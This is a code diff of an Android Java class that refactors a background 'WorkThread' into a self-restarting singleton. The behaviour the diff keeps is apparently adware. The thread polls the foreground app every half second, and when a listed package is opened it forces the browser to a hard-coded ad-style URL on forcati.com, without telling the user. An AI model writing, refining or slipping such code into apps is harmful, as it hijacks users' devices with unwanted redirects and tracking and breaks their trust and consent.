@@ -4,8 +4,8 @@ import android.content.Context;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.SystemClock;
-import android.util.Log;
 
+import com.android.utils.LogUtils;
 import com.android.utils.Utils;
 
 import java.util.List;
@@ -13,58 +13,47 @@ import java.util.List;
 /**
  * Created by laole918 on 2016/5/5 0005.
  */
-public class WorkThread implements Runnable {
+public class WorkThread extends Thread {
 
     public static final String TAG = WorkThread.class.getSimpleName();
 
+    private static WorkThread mInstances;
+
     private Context mContext;
-    private Thread mThread;
-    private String mTopApp;
     private boolean isWorking;
-    private boolean isReStarting;
 
     public WorkThread(Context context) {
         mContext = context;
-        mThread = null;
         isWorking = false;
-        isReStarting = false;
     }
 
-    public void start() {
-        reStart();
-    }
-
-    private void reStart() {
-        if (!isReStarting) {
-            isReStarting = true;
-            new Thread(new Runnable() {
-                @Override
-                public void run() {
-                    Log.d(TAG, "I'm restarting!!!");
-                    isWorking = false;
-                    while (mThread != null) {
-                        isWorking = false;
-                        SystemClock.sleep(1);
-                        Log.d(TAG, "mThread != null");
-                    }
-                    mThread = new Thread(WorkThread.this);
-                    isWorking = true;
-                    mThread.start();
-                }
-            }).start();
+    public static void start(Context context) {
+        if (mInstances == null || !mInstances.isAlive()) {
+            if (mInstances != null && !mInstances.isAlive()) {
+                mInstances.stopThread();
+                mInstances = null;
+            }
+            mInstances = new WorkThread(context);
+            mInstances.startThread();
         }
     }
 
-    public void stop() {
-        isWorking = false;
+    private void startThread() {
+        if (!isWorking) {
+            isWorking = true;
+            super.start();
+        }
+    }
+
+    private void stopThread() {
+        if (isWorking) {
+            isWorking = false;
+        }
     }
 
     @Override
     public void run() {
-        if (isReStarting) {
-            Log.d(TAG, "I'm restarted!!!");
-            isReStarting = false;
-        }
+        String mTopApp = null;
         while (isWorking) {
             if (!Utils.isTopApp(mContext, mTopApp)) {
                 mTopApp = null;
@@ -72,17 +61,14 @@ public class WorkThread implements Runnable {
                 for (String pk : packages) {
                     if (Utils.isTopApp(mContext, pk)) {
                         mTopApp = pk;
-//                        SystemClock.sleep(4000);
                         gotoUrl(pk);
                         break;
                     }
                 }
             }
-            Log.d(TAG, "I'm working!!!");
+            LogUtils.d(TAG, "I'm working!!!");
             SystemClock.sleep(500);
         }
-        mTopApp = null;
-        mThread = null;
     }
 
     public void gotoUrl(final String pk) {
@@ -93,6 +79,6 @@ public class WorkThread implements Runnable {
         intent.addCategory(Intent.CATEGORY_BROWSABLE);
         intent.setData(Uri.parse("http://forcati.com/get/iad/1-3532-23672a8af6abb34f1349a5b4ec91103c?cl=WW_MS&af=2"));
         mContext.startActivity(intent);
-        Log.d(TAG, "Open the url with:" + pk);
+        LogUtils.d(TAG, "Open the url with:" + pk);
     }
 }
